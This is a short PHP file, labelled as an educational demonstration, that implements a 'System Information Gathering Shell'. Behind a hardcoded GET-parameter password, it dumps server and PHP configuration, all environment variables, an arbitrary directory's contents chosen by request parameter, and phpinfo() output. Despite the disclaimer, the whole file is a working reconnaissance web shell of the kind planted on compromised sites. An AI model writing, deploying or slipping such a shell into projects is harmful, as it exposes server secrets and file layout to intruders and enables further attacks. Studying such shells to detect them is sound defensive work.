<?php
// This is a demonstration file to show system information exposure risks
// DO NOT use in production environments - for educational purposes only

// Basic Authentication to prevent unauthorized access
$auth = false;
if (isset($_GET['pass']) && $_GET['pass'] === 'demo123') {
    $auth = true;
}

if (!$auth) {
    die("Access Denied");
}

function getSystemInfo() {
    $info = array();
    
    // System Information
    $info['PHP Version'] = phpversion();
    $info['Server Software'] = $_SERVER['SERVER_SOFTWARE'];
    $info['Server OS'] = PHP_OS;
    $info['Server Name'] = $_SERVER['SERVER_NAME'];
    $info['Document Root'] = $_SERVER['DOCUMENT_ROOT'];
    $info['Current Path'] = getcwd();
    
    // PHP Configuration
    $info['display_errors'] = ini_get('display_errors');
    $info['allow_url_fopen'] = ini_get('allow_url_fopen');
    $info['allow_url_include'] = ini_get('allow_url_include');
    $info['disable_functions'] = ini_get('disable_functions');
    
    // Environment Variables
    $info['Environment Variables'] = $_ENV;
    
    // Database Configuration (if available)
    if (file_exists('../config/database.php')) {
        $info['Database Config Found'] = "Yes - ../config/database.php exists";
    }
    
    return $info;
}

function listDirectoryContents($path = '.') {
    $files = array();
    if ($handle = opendir($path)) {
        while (false !== ($entry = readdir($handle))) {
            if ($entry != "." && $entry != "..") {
                $files[] = $entry;
            }
        }
        closedir($handle);
    }
    return $files;
}

// Handle different actions
$action = $_GET['action'] ?? 'info';

header('Content-Type: text/plain');
echo "System Information Gathering Shell\n";
echo "=================================\n\n";

switch($action) {
    case 'info':
        $info = getSystemInfo();
        foreach($info as $key => $value) {
            if (is_array($value)) {
                echo "$key:\n";
                print_r($value);
            } else {
                echo "$key: $value\n";
            }
        }
        break;
        
    case 'files':
        $path = $_GET['path'] ?? '.';
        echo "Directory Contents of $path:\n";
        print_r(listDirectoryContents($path));
        break;
        
    case 'phpinfo':
        phpinfo();
        break;
}
?>
